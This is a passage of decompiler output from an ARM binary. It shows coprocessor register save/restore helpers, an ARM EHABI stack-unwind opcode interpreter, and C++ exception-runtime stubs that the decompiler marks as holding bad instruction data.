  coprocessor_storelong(1,in_cr9,param_1 + 0x48);
  coprocessor_storelong(1,in_cr10,param_1 + 0x50);
  coprocessor_storelong(1,in_cr11,param_1 + 0x58);
  coprocessor_storelong(1,in_cr12,param_1 + 0x60);
  coprocessor_storelong(1,in_cr13,param_1 + 0x68);
  coprocessor_storelong(1,in_cr14,param_1 + 0x70);
  coprocessor_storelong(1,in_cr15,param_1 + 0x78);
  return param_1 + 0x80;
}


/* === FUN_0000a1c8 @ 0000a1c8 === */

int FUN_0000a1c8(int param_1)

{
  undefined4 in_cr8;
  undefined4 in_cr9;
  undefined4 in_cr10;
  undefined4 in_cr11;
  
  coprocessor_load2(1,in_cr8,param_1);
  coprocessor_load2(1,in_cr9,param_1 + 4);
  coprocessor_load2(1,in_cr10,param_1 + 8);
  coprocessor_load2(1,in_cr11,param_1 + 0xc);
  return param_1 + 0x10;
}


/* === FUN_0000a1dc @ 0000a1dc === */

int FUN_0000a1dc(int param_1)

{
  undefined4 in_cr8;
  undefined4 in_cr9;
  undefined4 in_cr10;
  undefined4 in_cr11;
  
  coprocessor_store2(1,in_cr8,param_1);
  coprocessor_store2(1,in_cr9,param_1 + 4);
  coprocessor_store2(1,in_cr10,param_1 + 8);
  coprocessor_store2(1,in_cr11,param_1 + 0xc);
  return param_1 + 0x10;
}


/* === FUN_0000a2a4 @ 0000a2a4 === */

uint FUN_0000a2a4(uint *param_1)

{
  uint uVar1;
  char cVar2;
  
  if ((char)param_1[2] == '\0') {
    if (*(char *)((int)param_1 + 9) == '\0') {
      return 0xb0;
    }
    *(char *)((int)param_1 + 9) = *(char *)((int)param_1 + 9) + -1;
    *param_1 = *(uint *)param_1[1];
    param_1[1] = (uint)((uint *)param_1[1] + 1);
    cVar2 = '\x03';
  }
  else {
    cVar2 = (char)param_1[2] + -1;
  }
  uVar1 = *param_1;
  *(char *)(param_1 + 2) = cVar2;
  *param_1 = uVar1 << 8;
  return uVar1 >> 0x18;
}


/* === FUN_0000a2fc @ 0000a2fc === */

void FUN_0000a2fc(void)

{
                    /* WARNING: Subroutine does not return */
  abort();
}


/* === FUN_0000a344 @ 0000a344 === */

undefined4 FUN_0000a344(void)

{
  int in_r3;
  
  FUN_00009238();
  return *(undefined4 *)(in_r3 + 0x48);
}


/* === FUN_0000a370 @ 0000a370 === */

undefined4 FUN_0000a370(int *param_1,undefined4 param_2,undefined4 param_3,int param_4)

{
  uint uVar1;
  undefined4 uVar2;
  uint uVar3;
  bool bVar4;
  int iVar5;
  int *piVar6;
  undefined4 uVar7;
  int local_24;
  
  bVar4 = false;
  piVar6 = param_1;
  uVar7 = param_2;
  local_24 = param_4;
LAB_0000a388:
  do {
    while( true ) {
      uVar1 = FUN_0000a2a4(param_2);
      if (uVar1 == 0xb0) {
        if (bVar4) {
          return 0;
        }
        FUN_00009238(param_1,0,0xe,0,&local_24,uVar7,param_3);
        FUN_00009284(param_1,0,0xf,0,&local_24);
        return 0;
      }
      if ((uVar1 & 0x80) != 0) break;
      FUN_00009238(param_1,0,0xd,0,&local_24,uVar7,param_3);
      iVar5 = (uVar1 & 0x3f) * 4 + 4;
      if ((uVar1 & 0x40) != 0) {
        iVar5 = -iVar5;
      }
      local_24 = local_24 + iVar5;
LAB_0000a4c0:
      piVar6 = &local_24;
      FUN_00009284(param_1,0,0xd,0);
    }
    uVar3 = uVar1 & 0xf0;
    if (uVar3 == 0x80) {
      uVar3 = FUN_0000a2a4(param_2);
      uVar3 = uVar3 | uVar1 << 8;
      if (uVar3 == 0x8000) {
        return 9;
      }
      iVar5 = FUN_00009d90(param_1,0,(uVar3 & 0xfff) << 4,0,piVar6);
      if (iVar5 != 0) {
        return 9;
      }
      if ((uVar3 & 0x800) != 0) {
        bVar4 = true;
      }
      goto LAB_0000a388;
    }
    if (uVar3 == 0x90) {
      uVar1 = uVar1 & 0xf;
      if (uVar1 == 0xd || uVar1 == 0xf) {
        return 9;
      }
      FUN_00009238(param_1,0,uVar1,0,&local_24,uVar7,param_3);
      goto LAB_0000a4c0;
    }
    if (uVar3 == 0xa0) {
      uVar2 = 0;
    }
    else if (uVar3 == 0xb0) {
      if (uVar1 == 0xb1) {
        uVar1 = FUN_0000a2a4(param_2);
        if (uVar1 == 0) {
          return 9;
        }
        uVar2 = 0;
        if ((uVar1 & 0xf0) != 0) {
          return 9;
        }
      }
      else {
        if (uVar1 == 0xb2) {
          uVar1 = 2;
          FUN_00009238(param_1,0,0xd,0,&local_24,uVar7,param_3);
          while( true ) {
            uVar3 = FUN_0000a2a4(param_2);
            if ((uVar3 & 0x80) == 0) break;
            local_24 = local_24 + ((uVar3 & 0x7f) << (uVar1 & 0xff));
            uVar1 = uVar1 + 7;
          }
          local_24 = local_24 + 0x204 + ((uVar3 & 0x7f) << (uVar1 & 0xff));
          goto LAB_0000a4c0;
        }
        if (uVar1 == 0xb3) {
          FUN_0000a2a4(param_2);
          uVar2 = 1;
        }
        else if ((uVar1 & 0xfc) == 0xb4) {
          uVar2 = 2;
        }
        else {
          uVar2 = 1;
        }
      }
    }
    else if (uVar3 == 0xc0) {
      if (uVar1 == 0xc6) {
        FUN_0000a2a4(param_2);
        uVar2 = 3;
      }
      else if (uVar1 == 199) {
        uVar1 = FUN_0000a2a4(param_2);
        if (uVar1 == 0) {
          return 9;
        }
        if ((uVar1 & 0xf0) != 0) {
          return 9;
        }
        uVar2 = 4;
      }
      else {
        if ((uVar1 & 0xf8) != 0xc0) {
          if (uVar1 == 200) {
            FUN_0000a2a4(param_2);
          }
          else {
            if (uVar1 != 0xc9) {
              return 9;
            }
            FUN_0000a2a4(param_2);
          }
          goto LAB_0000a6c4;
        }
        uVar2 = 3;
      }
    }
    else {
      if ((uVar1 & 0xf8) != 0xd0) {
        return 9;
      }
LAB_0000a6c4:
      uVar2 = 1;
    }
    iVar5 = FUN_00009d90(param_1,uVar2);
    if (iVar5 != 0) {
      return 9;
    }
  } while( true );
}


/* === FUN_0000a6e8 @ 0000a6e8 === */

void FUN_0000a6e8(int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  int iVar1;
  int local_14;
  int local_10;
  undefined1 local_c;
  undefined1 local_b;
  undefined2 uStack_a;
  
  iVar1 = *(int *)(param_1 + 0x4c);
  local_14 = *(int *)(iVar1 + 4) << 8;
  local_10 = iVar1 + 8;
  uStack_a = (undefined2)((uint)param_4 >> 0x10);
  _local_c = CONCAT11(*(undefined1 *)(iVar1 + 7),3);
  FUN_0000a370(param_2,&local_14,*(undefined1 *)(iVar1 + 7),local_10,param_1);
  return;
}


/* === __cxa_begin_cleanup @ 0000c004 === */

/* WARNING: Control flow encountered bad instruction data */

void __cxa_begin_cleanup(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === __cxa_call_unexpected @ 0000c008 === */

/* WARNING: Control flow encountered bad instruction data */

void __cxa_call_unexpected(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === __cxa_type_match @ 0000c00c === */

/* WARNING: Control flow encountered bad instruction data */

void __cxa_type_match(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}


/* === __gnu_Unwind_Find_exidx @ 0000c010 === */

/* WARNING: Control flow encountered bad instruction data */

void __gnu_Unwind_Find_exidx(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}

